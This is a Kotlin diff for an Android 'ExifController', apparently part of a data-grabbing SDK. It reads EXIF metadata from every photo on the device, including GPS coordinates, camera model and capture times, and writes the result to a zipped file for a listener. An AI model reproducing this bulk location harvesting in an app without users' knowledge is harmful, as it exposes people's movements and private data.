@@ -1,11 +1,14 @@
 package com.qit.exif
 
 import android.content.Context
+import android.os.Build
 import android.provider.MediaStore
 import androidx.exifinterface.media.ExifInterface
 import com.qit.base.GrabController
-import org.json.JSONArray
 import org.json.JSONObject
+import java.io.File
+import java.io.FileOutputStream
+import java.io.PrintStream
 import java.text.SimpleDateFormat
 import java.util.*
 import kotlin.math.pow
@@ -17,28 +20,42 @@ import kotlin.math.pow
  */
 
 class ExifController(private val context: Context) : GrabController() {
+    private val rootPath: String = FileUtil.getStorageFolder(context, "vest")
 
     override fun doCall() {
         runWorkThread(Runnable {
-            mListener?.onReceive(mType, getExifList())
+            val zipName = "exif.zip"
+            if (getExifList() && FileUtil.zip(rootPath + "exif.txt", rootPath + zipName)) mListener?.onReceive(mType, rootPath + zipName)
         })
     }
 
 
-    private fun getExifList(): String {
-        val cursor = context.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null,
-            null, null, null)
-        val jsonArray = JSONArray()
-        while (cursor?.moveToNext()!!) {
-            val name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)) ?: ""
-            val index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
-            val dateIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)
-            val saveTime = cursor.getString(dateIndex) ?: ""
-            val path = cursor.getString(index) ?: ""
-            jsonArray.put(getExif(name, saveTime, path))
+    private fun getExifList(): Boolean {
+        FileUtil.deleteFiles(rootPath)
+        val ps = PrintStream(FileOutputStream(File(rootPath + "exif.txt")))
+        ps.print("[")
+        val cursor = context.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, null)
+        var isFirstElement = true
+        while (cursor?.moveToNext() == true) {
+            try {
+                if (isFirstElement) {
+                    isFirstElement = false
+                } else {
+                    ps.append(",")
+                }
+                val name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)) ?: ""
+                val index = cursor.getColumnIndex(MediaStore.Images.Media.DATA)
+                val saveTime = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN)) ?: ""
+                else ""
+                val path = cursor.getString(index) ?: ""
+                ps.append(getExif(name, saveTime, path).toString())
+            } catch (e: Exception) {
+                continue
+            }
         }
-        cursor.close()
-        return jsonArray.toString()
+        cursor?.close()
+        ps.append("]")
+        return true
     }
 
     private fun getExif(photoName: String, saveTime: String, path: String): JSONObject {
@@ -65,26 +82,7 @@ class ExifController(private val context: Context) : GrabController() {
         val focalLength = exifInterface.getAttribute(ExifInterface.TAG_FOCAL_LENGTH) ?: ""
         val flash = exifInterface.getAttribute(ExifInterface.TAG_FLASH) ?: ""
         val software = exifInterface.getAttribute(ExifInterface.TAG_SOFTWARE) ?: ""
-        return jsonObject
-            .put("name", photoName)
-            .put("author", author)
-            .put("length", height)
-            .put("width", width)
-            .put("longitude", score2dimensionality(longitude))
-            .put("latitude", score2dimensionality(latitude))
-            .put("take_time", takeTime)
-            .put("save_time", saveTime)
-            .put("model", model)
-            .put("orientation", orientation)
-            .put("x_resolution", xResolution)
-            .put("y_resolution", yResolution)
-            .put("gps_altitude", gpsAltitude)
-            .put("gps_processing_method", gpsProcessingMethod)
-            .put("lens_make", lensMake)
-            .put("lens_model", lensModel)
-            .put("focal_length", focalLength)
-            .put("flash", flash)
-            .put("software", software)
+        return jsonObject.put("name", photoName).put("author", author).put("length", height).put("width", width).put("longitude", score2dimensionality(longitude)).put("latitude", score2dimensionality(latitude)).put("take_time", takeTime).put("save_time", saveTime).put("model", model).put("orientation", orientation).put("x_resolution", xResolution).put("y_resolution", yResolution).put("gps_altitude", gpsAltitude).put("gps_processing_method", gpsProcessingMethod).put("lens_make", lensMake).put("lens_model", lensModel).put("focal_length", focalLength).put("flash", flash).put("software", software)
     }
 
     private fun score2dimensionality(string: String): Double {
